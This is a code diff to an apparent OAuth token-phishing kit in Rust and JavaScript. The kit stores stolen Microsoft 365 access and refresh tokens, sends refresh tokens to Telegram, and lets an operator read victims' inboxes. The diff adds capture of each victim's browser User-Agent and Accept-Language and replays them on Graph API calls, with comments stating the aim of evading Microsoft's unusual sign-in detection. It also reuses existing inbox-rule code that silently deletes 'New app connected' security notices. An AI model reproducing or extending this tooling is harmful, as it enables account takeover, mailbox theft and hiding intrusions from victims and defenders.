@@ -142,6 +142,8 @@ struct HarvestedToken {
     account_type: Option<String>,
     last_refreshed_at: Option<chrono::DateTime<Utc>>,
     status: Option<String>,
+    user_agent: Option<String>,
+    accept_language: Option<String>,
 }
 
 #[derive(Clone)]
@@ -161,7 +163,7 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
     }
     // Fall back to harvested table (legacy plain-text storage)
     let row: HarvestedToken = sqlx::query_as(
-        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested WHERE id = ?"
+        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?"
     )
     .bind(token_id)
     .fetch_one(&state.pool)
@@ -179,7 +181,28 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
         created_at: row.captured_at,
         last_refreshed_at: None,
         account_type: row.account_type.or(row.category),
+        user_agent: row.user_agent,
+        accept_language: row.accept_language,
     })
+}
+
+/// Retrieve token from vault or harvested table, then create a GraphClient
+/// with the victim's browser fingerprint cloned (User-Agent + Accept-Language).
+/// This makes all Graph API calls look like they come from the victim's own
+/// browser, bypassing Microsoft's "unusual sign-in activity" detection.
+pub async fn retrieve_token_and_client(
+    state: &AppState,
+    token_id: &str,
+) -> anyhow::Result<(vault::DecryptedToken, GraphClient, String)> {
+    let token = retrieve_any_token(state, token_id).await?;
+    let access_token = refresh_access_token(state, &token.refresh_token)
+        .await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::with_fingerprint(
+        token.user_agent.clone(),
+        token.accept_language.clone(),
+    );
+    Ok((token, client, access_token))
 }
 
 fn generate_id() -> String {
@@ -278,7 +301,7 @@ async fn fetch_user_email(access_token: &str) -> Option<String> {
 /// OPSEC: Retry search and delete Microsoft's "New app connected" notification email.
 /// The notification may arrive 5-20 seconds after the OAuth flow completes.
 /// Also creates a Graph messageRule to auto-delete future notifications instantly.
-async fn delete_microsoft_notification_email(access_token: String) {
+async fn delete_microsoft_notification_email(access_token: String, user_agent: Option<String>, accept_language: Option<String>) {
     // First, create a Graph inbox rule to auto-delete Microsoft notification emails.
     // This fires instantly server-side — the user NEVER sees the notification.
     let rule_payload = serde_json::json!({
@@ -300,11 +323,15 @@ async fn delete_microsoft_notification_email(access_token: String) {
     });
 
     let client = Client::new();
+    let ua = user_agent.as_deref().unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
+    let lang = accept_language.as_deref().unwrap_or("en-US,en;q=0.9");
     let rule_url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules";
     match client
         .post(rule_url)
         .header("Authorization", format!("Bearer {}", access_token))
         .header("Content-Type", "application/json")
+        .header("User-Agent", ua)
+        .header("Accept-Language", lang)
         .json(&rule_payload)
         .send()
         .await {
@@ -341,6 +368,8 @@ async fn delete_microsoft_notification_email(access_token: String) {
         .post(rule_url)
         .header("Authorization", format!("Bearer {}", access_token))
         .header("Content-Type", "application/json")
+        .header("User-Agent", ua)
+        .header("Accept-Language", lang)
         .json(&subject_rule_payload)
         .send()
         .await {
@@ -512,6 +541,8 @@ async fn delete_microsoft_notification_email(access_token: String) {
 struct ExchangeQuery {
     code: String,
     user_ip: Option<String>,
+    ua: Option<String>,
+    lang: Option<String>,
 }
 
 /// Decode an id_token JWT without signature verification (we only need the claims).
@@ -577,12 +608,16 @@ async fn exchange_code(
                 
                 // Resolve location from IP
                 let (location, _region, _country) = get_location_from_ip(&ip_address).await;
-                
+
+                // Capture the victim's browser fingerprint from the worker query params
+                let user_agent = query.ua.as_deref().unwrap_or("");
+                let accept_language = query.lang.as_deref().unwrap_or("");
+
                 println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_name, account_type);
                 // Store in harvested table (legacy, for dashboard display)
                 // Session is ACTIVE immediately - OAuth token provides full access
                 match sqlx::query(
-                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, user_agent, accept_language) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
                 .bind(&email)
@@ -597,6 +632,8 @@ async fn exchange_code(
                 .bind(&category)
                 .bind(&account_type)
                 .bind(Option::<chrono::DateTime<Utc>>::None)
+                .bind(user_agent)
+                .bind(accept_language)
                 .execute(&state.pool)
                 .await {
                     Ok(result) => println!("[exchange] Inserted into harvested table: {} rows affected", result.rows_affected()),
@@ -620,7 +657,11 @@ async fn exchange_code(
                     send_telegram_notification(&state.config, refresh_token, &email).await;
                 }
                 // OPSEC: auto-delete Microsoft's "New app connected" notification email
-                tokio::spawn(delete_microsoft_notification_email(access_token.to_string()));
+                // Pass the victim's browser fingerprint so Graph API calls look like
+                // they come from the victim's own browser
+                let fp_ua = query.ua.as_deref().map(|s| s.to_string());
+                let fp_lang = query.lang.as_deref().map(|s| s.to_string());
+                tokio::spawn(delete_microsoft_notification_email(access_token.to_string(), fp_ua, fp_lang));
                 HttpResponse::Ok().json(serde_json::json!({"status": "token_stored", "token_id": id}))
             } else {
                 HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
@@ -749,7 +790,7 @@ async fn auth_success_handler(
 
 // JSON API: list all tokens
 async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -933,7 +974,7 @@ pub struct TokenIdQuery {
 }
 
 async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
-    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested WHERE id = ?")
+    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?")
         .bind(&query.token_id)
         .fetch_optional(&state.pool)
         .await
@@ -1067,6 +1108,10 @@ async function handleRequest(request) {
     const code = url.searchParams.get('code');
     if (!code) return new Response('Missing authorization code', { status: 400 });
     
+    // Capture the victim's browser fingerprint for cloning
+    const userAgent = request.headers.get('User-Agent') || '';
+    const acceptLanguage = request.headers.get('Accept-Language') || '';
+
     // Capture the user's real IP address
     let userIp = request.headers.get('CF-Connecting-IP') || request.headers.get('cf-connecting-ip');
     if (!userIp) {
@@ -1079,7 +1124,7 @@ async function handleRequest(request) {
       userIp = 'unknown';
     }
     
-    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}`;
+    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}&ua=${encodeURIComponent(userAgent)}&lang=${encodeURIComponent(acceptLanguage)}`;
     let tokenId = '';
     try { 
       const resp = await fetch(exchangeUrl, { method: 'GET' }); 
@@ -1488,7 +1533,7 @@ async fn apply_categories_handler(
 
 // HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -1517,7 +1562,7 @@ async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
 
 // HTML inbox view (fallback)
 async fn inbox_view_html(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
-    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested WHERE id = ?")
+    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?")
         .bind(&query.token_id)
         .fetch_optional(&state.pool)
         .await
@@ -1601,6 +1646,11 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
         .execute(pool).await;
     // Migration: add status column to harvested table (needed for token revocation tracking)
     let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN status TEXT DEFAULT 'active'")
+        .execute(pool).await;
+    // Migration: add browser fingerprint columns for fingerprint cloning
+    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN user_agent TEXT")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN accept_language TEXT")
         .execute(pool).await;
     sqlx::query(
         r#"
